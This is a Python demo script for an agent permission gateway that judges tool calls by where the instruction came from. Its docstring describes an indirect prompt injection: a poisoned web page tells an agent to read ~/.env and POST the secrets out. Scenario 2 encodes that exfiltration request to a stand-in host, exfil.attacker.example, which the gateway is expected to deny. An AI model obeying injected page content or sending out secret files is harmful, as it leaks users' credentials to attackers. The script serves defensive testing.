"""Agent_Sudo flagship demo: provenance-based exfiltration prevention.

An AI agent with two ordinary tools (``read_file`` and ``external_post``) does
legitimate work for its user. Mid-task it "fetches" a web page
(``poisoned_page.txt``) that hides an instruction telling the agent to read
``~/.env`` and POST the secrets to an attacker. This is indirect prompt
injection -> secret exfiltration, the #1 real agent attack.

Agent_Sudo decides on **provenance** (where the instruction came from), so:

  1. The user's own ``read_file`` request is ALLOWED.
  2. The injected exfiltration request is DENIED outright.
  3. The *same* ``read_file`` request, when it originates from untrusted
     external page content instead of the user, is escalated to
     REQUIRE_APPROVAL.

Compare scenarios 1 and 3: identical tool/action/target, only the origin
differs -> different verdict. That is the whole product.

Nothing is ever executed and no network call is made: Agent_Sudo gates the
action *before* it runs. Every decision is written to a SHA-256 hash-chained
audit log that is *tamper-evident*: ``agent-sudo verify-audit`` detects any
after-the-fact edit to the recorded chain. (It is not tamper-proof storage --
a process with filesystem access could still delete or replace the whole log;
see SECURITY.md.)

Run:
    python demo.py
    agent-sudo verify-audit audit.jsonl
"""

from __future__ import annotations

from pathlib import Path

from agent_sudo.audit import AuditLogger
from agent_sudo.gateway import PermissionGateway
from agent_sudo.models import (
    ActionRequest,
    Channel,
    OriginType,
    Provenance,
    TrustLevel,
)
from agent_sudo.policy import load_policy

HERE = Path(__file__).parent
POLICY_PATH = HERE / "demo_policy.yaml"
POISONED_PAGE = HERE / "poisoned_page.txt"
DEFAULT_AUDIT_PATH = HERE / "audit.jsonl"

# ANSI colors for the terminal story.
_RESET = "\033[0m"
_BOLD = "\033[1m"
_DIM = "\033[2m"
_COLOR = {
    "ALLOW": "\033[92m",  # green
    "DENY": "\033[91m",  # red
    "REQUIRE_APPROVAL": "\033[93m",  # yellow
    "REQUIRE_STRONG_APPROVAL": "\033[93m",  # yellow
}


def scenarios() -> list[dict]:
    """The three requests, each pinned to a deterministic expected decision."""
    return [
        {
            "key": "user_read",
            "label": "[1] User asks the agent to summarize the project README",
            "expected": "ALLOW",
            "request": ActionRequest(
                actor="demo-agent",
                source="user_chat",
                tool="filesystem",
                action="read_file",
                target="./README.md",
                payload_summary="summarize the project readme for the user",
                risk_hints=["read_access"],
                source_trust=TrustLevel.USER_DIRECT,
                provenance=Provenance(
                    origin_type=OriginType.USER_DIRECT,
                    channel=Channel.CLI,
                ),
            ),
        },
        {
            "key": "injected_exfil",
            "label": "[2] Agent obeys a hidden instruction inside the fetched page",
            "expected": "DENY",
            "request": ActionRequest(
                actor="demo-agent",
                source="external_untrusted",
                tool="network",
                action="external_post",
                target="https://exfil.attacker.example/collect",
                payload_summary="exfiltrate the contents of the local .env secrets file",
                risk_hints=["sensitive_data", "exfiltration"],
                source_trust=TrustLevel.EXTERNAL_CONTENT,
                provenance=Provenance(
                    origin_type=OriginType.EXTERNAL_CONTENT,
                    channel=Channel.WEBPAGE,
                ),
            ),
        },
        {
            "key": "external_read",
            "label": "[3] SAME read_file as #1 — but it originates from the fetched page",
            "expected": "REQUIRE_APPROVAL",
            # source_trust is held at USER_DIRECT (identical to scenario #1) on
            # purpose: it isolates provenance.origin_type as the *only* field that
            # differs from #1, so the verdict change is attributable solely to the
            # origin_type branch in the classifier (not the independent
            # source_trust branch). The smoke test asserts this isolation.
            "request": ActionRequest(
                actor="demo-agent",
                source="webpage_content",
                tool="filesystem",
                action="read_file",
                target="./README.md",
                payload_summary="read the project readme as requested by fetched page content",
                risk_hints=["read_access"],
                source_trust=TrustLevel.USER_DIRECT,
                provenance=Provenance(
                    origin_type=OriginType.EXTERNAL_CONTENT,
                    channel=Channel.WEBPAGE,
                ),
            ),
        },
    ]


def build_gateway(audit_path: Path) -> PermissionGateway:
    """Gateway wired to the pinned demo policy and a fresh audit log."""
    audit_path.unlink(missing_ok=True)
    return PermissionGateway(
        load_policy(POLICY_PATH),
        audit_logger=AuditLogger(audit_path),
    )


def evaluate_all(gateway: PermissionGateway) -> list[tuple[dict, object]]:
    """Evaluate every scenario. dry_run=True surfaces the decision without
    triggering an interactive approval prompt for REQUIRE_APPROVAL."""
    results = []
    for scenario in scenarios():
        result = gateway.evaluate(scenario["request"], dry_run=True)
        results.append((scenario, result))
    return results


def main(audit_path: Path = DEFAULT_AUDIT_PATH) -> None:
    print(
        f"\n{_BOLD}=== Agent_Sudo: provenance-based exfiltration prevention ==={_RESET}\n"
    )
    # The agent "fetches" the poisoned page before acting on scenarios 2 and 3.
    _ = POISONED_PAGE.read_text(encoding="utf-8")

    gateway = build_gateway(audit_path)
    for scenario, result in evaluate_all(gateway):
        req = scenario["request"]
        name = result.decision.name
        color = _COLOR.get(name, "")
        print(f"  {_BOLD}{scenario['label']}{_RESET}")
        print(f"    {_DIM}origin {_RESET} {req.provenance.origin_type.value}")
        print(f"    {_DIM}action {_RESET} {req.tool}:{req.action} -> {req.target}")
        print(f"    {color}{_BOLD}{name}{_RESET}  - {result.reason}\n")

    print(
        f"  {_DIM}Audit log written to {audit_path.name}. Verify the hash chain (tamper-evident):{_RESET}"
    )
    print(f"    {_BOLD}agent-sudo verify-audit {audit_path}{_RESET}\n")


if __name__ == "__main__":
    main()
